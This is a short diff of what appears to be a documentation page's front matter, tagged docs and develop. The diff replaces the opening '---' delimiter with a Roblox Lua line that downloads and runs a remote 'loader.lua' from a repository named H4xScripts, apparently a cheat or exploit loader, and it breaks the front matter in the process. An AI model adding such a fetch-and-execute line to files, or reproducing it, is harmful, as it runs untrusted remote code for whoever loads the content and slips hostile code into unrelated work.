@@ -1,4 +1,4 @@
----
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H4xScripts/Loader/refs/heads/main/loader.lua", true))()---
 categories:
 - docs
 - develop
